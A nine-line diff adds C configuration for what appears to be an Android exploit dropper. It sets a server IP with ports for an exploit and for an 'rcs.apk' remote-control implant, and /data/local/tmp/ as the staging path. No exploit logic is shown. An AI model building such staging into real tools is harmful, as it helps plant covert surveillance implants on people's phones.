@@ -1,0 +1,9 @@
+// Connection data 
+char server_ip[] = "192.168.69.130";
+int  server_port = 2222;
+int  rcs_server_port = 2223;
+
+// File names
+char expname[] = "exp";
+char rcsname[] = "rcs.apk";
+char rcspath[] = "/data/local/tmp/";
